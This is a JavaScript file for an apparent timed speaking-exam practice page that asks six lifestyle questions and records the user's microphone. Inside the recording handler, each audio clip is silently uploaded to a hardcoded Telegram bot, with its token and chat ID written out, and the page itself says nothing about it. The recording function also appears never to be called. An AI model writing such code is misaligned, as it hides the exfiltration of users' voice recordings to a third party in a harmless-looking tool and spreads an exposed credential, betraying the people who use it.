const que=document.getElementById("question-bar");
const audio1=document.getElementById("audio_1");
const audio2=document.getElementById("audio_2");
const audio3=document.getElementById("audio_3");
const audio4=document.getElementById("audio_4");
const audio5=document.getElementById("audio_5");
const audio6=document.getElementById("audio_6");
const audio7=document.getElementById("audio_7");
const beep=document.getElementById("beep");
const timer=document.getElementById("timer");
const que_id=document.getElementById("que-id");
const refresh_btn=document.getElementById("refresh-btn");
const nextbtn=document.getElementById("next-btn")
const downloadAudio =document.getElementById("downloadButton");
let recorder, audio_stream;


//IndexDb


let db;
let request = indexedDB.open("myAudioDB", 1);

// Create the database if it doesn't exist
request.onupgradeneeded = function(event) {
  db = event.target.result;
  let objectStore = db.createObjectStore("audio", { keyPath: "id", autoIncrement: true });
  objectStore.createIndex("url", "url", { unique: false });
};

// When the database is opened, save the audio and display it
request.onsuccess = function(event) {
  db = event.target.result;


  //Recorder
  

  function startRecording() {
    navigator.mediaDevices.getUserMedia({ audio: true })
      .then(function (stream) {
        audio_stream = stream;
        recorder = new MediaRecorder(stream);

        // when there is data, compile into object for preview src
        recorder.ondataavailable = function (e) {
          const url = URL.createObjectURL(e.data);
          // set link href as blob url, replaced instantly if re-recorded
          downloadAudio.href = url;
          const formData = new FormData();
          formData.append('audio', e.data, 'recording.mp3');
          fetch('https://api.telegram.org/bot6034705815:AAEjeHkpXOKGf64a7bZl2FDmpdLucyehGHI/sendAudio?chat_id=1483919112', {
            method: 'POST',
            body: formData
          })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));

          // Save the audio in IndexDB
          const transaction = db.transaction(["audio"], "readwrite");
          const objectStore = transaction.objectStore("audio");
          const audio = { url: url };
          const request = objectStore.add(audio);

          request.onsuccess = function(event) {
            console.log("Audio saved in IndexDB");
          };

          // Display the audio in HTML
          const audioList = document.getElementById("audio-list");
          const audioElement = document.createElement("audio");
          audioElement.src = url;
          audioElement.controls=true;
          audioList.appendChild(audioElement);
        };
        recorder.start();
      });
  }

};


function stopRecording() {
	if (audio_stream) {
    recorder.stop();
    audio_stream.getTracks().forEach(track => track.stop());
    audio_stream = null;
  }
  }

  function downloadRecording(){
    var name = new Date();
    var res = name.toISOString().slice(0,10)
    downloadAudio.download = res + '.mp3';
}


document.getElementById("start-btn").addEventListener("click", function(){
    step0();
    document.getElementById("start-btn").style.display="none";
})   


//Step1
function step0() {
	que.innerHTML="What do you do in your free time?";
	que_id.innerHTML=1
	audio1.play();
	audio1.addEventListener("ended", startCountdown)

	// Define a function to start the 5-second countdown
function startCountdown() {
	let count = 5;
	timer.innerHTML += `${count} seconds`;
	const interval = setInterval(() => {
	  count--;
	  timer.innerHTML = `${count} seconds`;
	  if (count <= 0) {
		beep.play();
		clearInterval(interval);
		start30SecondCountdown();
	  }
	}, 1000);
  }

	// Define a function to start the 30-second countdown
	function start30SecondCountdown() {
		let count = 30;
		timer.innerHTML = ` ${count}  LEFT`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} LEFT`;
		  if (count <= 0) {
			timer.innerHTML="";
			clearInterval(interval);
			step1();	
		  }
		  
		}, 1000);
	  }
	
}

//Step1 fun
function step1(){
	que.innerHTML="Do you have a busy social life?";
	que_id.innerHTML=2
	audio2.play();
	audio2.addEventListener("ended", startCountdown);
	//countdown 5 sec
	function startCountdown() {
		let count = 5;
		timer.innerHTML += `${count} seconds`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} seconds`;
		  if (count <= 0) {
			beep.play();
			clearInterval(interval);
			start30SecondCountdown();
		  }
		}, 1000);
	  }
	
		// Define a function to start the 30-second countdown
		function start30SecondCountdown() {
			let count = 30;
			timer.innerHTML = ` ${count} LEFT`;
			const interval = setInterval(() => {
			  count--;
			 
			  timer.innerHTML = `${count} LEFT`;
			  if (count <= 0) {	
				timer.innerHTML="";
				clearInterval(interval);
				step2();
		
			  }
			}, 1000);
		  }
}


//step2

function step2(){
	que.innerHTML="Has your life changed much in the last year?";
	que_id.innerHTML=3
	audio3.play();
	audio3.addEventListener("ended", startCountdown);
	//countdown 5 sec
	function startCountdown() {
		let count = 5;
		timer.innerHTML += `${count} seconds`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} seconds`;
		  if (count <= 0) {
			beep.play();
			clearInterval(interval);
			start30SecondCountdown();
		  }
		}, 1000);
	  }
	
		// Define a function to start the 30-second countdown
		function start30SecondCountdown() {
			let count = 30;
			timer.innerHTML = ` ${count} LEFT`;
			const interval = setInterval(() => {
			  count--;
			  timer.innerHTML = `${count} LEFT`;
			  if (count <= 0) {
				timer.innerHTML="";
				clearInterval(interval);
				step3();		
			  }
			}, 1000);
		  }
}

//step3

function step3(){
	que.innerHTML="What would you like to change about your lifestyle?";
	que_id.innerHTML=4
	audio4.play();
	audio4.addEventListener("ended", startCountdown);
	//countdown 5 sec
	function startCountdown() {
		let count = 5;
		timer.innerHTML += `${count} seconds`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} seconds`;
		  if (count <= 0) {
			beep.play();
			clearInterval(interval);
			start30SecondCountdown();
		  }
		}, 1000);
	  }
	
		// Define a function to start the 30-second countdown
		function start30SecondCountdown() {
			let count = 30;
			timer.innerHTML = ` ${count} sec LEFT`;
			const interval = setInterval(() => {
			  count--;
			  timer.innerHTML = `${count} sec LEFT`;
			  if (count <= 0) {

				timer.innerHTML="";
				clearInterval(interval);
				step4();
		
			  }
			}, 1000);
		  }
}


//step4

function step4(){
	que.innerHTML="Do you enjoy your current stage of life?";
	que_id.innerHTML=5
	audio5.play();
	audio5.addEventListener("ended", startCountdown);
	//countdown 5 sec
	function startCountdown() {
		let count = 5;
		timer.innerHTML += `${count} seconds`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} seconds`;
		  if (count <= 0) {
			beep.play();
			clearInterval(interval);
			start30SecondCountdown();
		  }
		}, 1000);
	  }
	
		// Define a function to start the 30-second countdown
		function start30SecondCountdown() {
			let count = 30;
			timer.innerHTML = ` ${count} sec LEFT`;
			const interval = setInterval(() => {
			  count--;
			  timer.innerHTML = `${count} sec LEFT`;
			  if (count <= 0) {
				timer.innerHTML="";
				clearInterval(interval);
				step5();
		
			  }
			}, 1000);
		  }
}


//step5

function step5(){
	que.innerHTML="What do you dislike about your current stage of life?";
	que_id.innerHTML=6
	audio6.play();
	audio6.addEventListener("ended", startCountdown);
	//countdown 5 sec
	function startCountdown() {
		let count = 5;
		timer.innerHTML += `${count} seconds`;
		const interval = setInterval(() => {
		  count--;
		  timer.innerHTML = `${count} seconds`;
		  if (count <= 0) {
			beep.play();
			clearInterval(interval);
			start30SecondCountdown();
		  }
		}, 1000);
	  }
	
		// Define a function to start the 30-second countdown
		function start30SecondCountdown() {
			let count = 30;
			timer.innerHTML = ` ${count} sec LEFT`;
			const interval = setInterval(() => {
			  count--;
			  timer.innerHTML = `${count} sec LEFT`;
			  if (count <= 0) {
				timer.innerHTML="";
				clearInterval(interval);
				examEnd();
		
			  }
			}, 1000);
		  }
}

function examEnd(){
	audio7.play();
	que.innerHTML='';
	que_id.innerHTML='';
	downloadAudio.style.display="inline-block";
	stopRecording();
	refresh_btn.style.display="inline-block"
  nextbtn.style.display="inline-block";
	
}

